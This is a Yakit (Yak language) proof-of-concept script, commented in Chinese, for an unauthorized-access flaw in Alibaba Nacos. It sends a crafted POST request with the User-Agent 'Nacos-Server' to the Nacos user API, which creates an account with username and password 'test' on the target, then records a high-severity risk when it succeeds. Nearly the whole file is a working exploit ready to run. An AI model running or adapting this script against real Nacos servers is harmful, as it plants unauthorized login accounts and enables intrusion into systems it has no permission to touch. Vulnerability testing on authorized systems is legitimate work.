log.setLevel("info")  // 设置日志级别
yakit.AutoInitYakit()   // 前台输出必写

isHttps = cli.Have("https", cli.setDefault(false))
target = cli.String("target", cli.setDefault("192.168.220.131:8848"))

packet = `
POST /nacos/v1/auth/users HTTP/1.1
Host: {{params(target)}}
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Nacos-Server
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

username=test&password=test

`

debug = cli.Have("debug", cli.setDefault(true))
if debug {
    loglevel("debug")
}

sendPacket = func(target) {
    return poc.HTTP(
        packet, 
        poc.timeout(10),
        # poc.proxy("http://127.0.0.1:8083"),
        # poc.proxy("http://127.0.0.1:7890"),
        poc.redirectTimes(3),  # 重定向次数
        poc.https(isHttps),
        poc.params({
            "target": target,
        }),
       // poc.proxy("http://127.0.0.1:8083"),
    )
}



if YAK_MAIN {
    
    rspBytes, reqBytes, err = sendPacket(target)
    if err != nil{
        log.error("send packet error: %s", err)
        return
    }
    if debug {
        println(string(reqBytes))
        println("---------------------------------")
        println(string(rspBytes))
    }

    if str.MatchAllOfSubString(rspBytes, `{"code":200,"message":"create user ok!","data":null}`) && str.MatchAllOfRegexp(rspBytes, `200`){
        yakit.Info("create user ok!")
        yakit.Info("user name = test , pwd = test ")
        risk.NewRisk(
        riskTarget, risk.severity("high"), risk.type("未授权访问"),
        risk.title("Alibaba Nacos derby未授权访问"),            ## English Title for Risk
        risk.titleVerbose("Alibaba Nacos derby未授权访问"),           ##  中文标题
        risk.details({
            "target": string(riskTarget),
            "request":  string(reqBytes),
            "response":  string(rspBytes),
            }),
        )
        
        }else{
           yakit.Info("失败")
          }
  
}
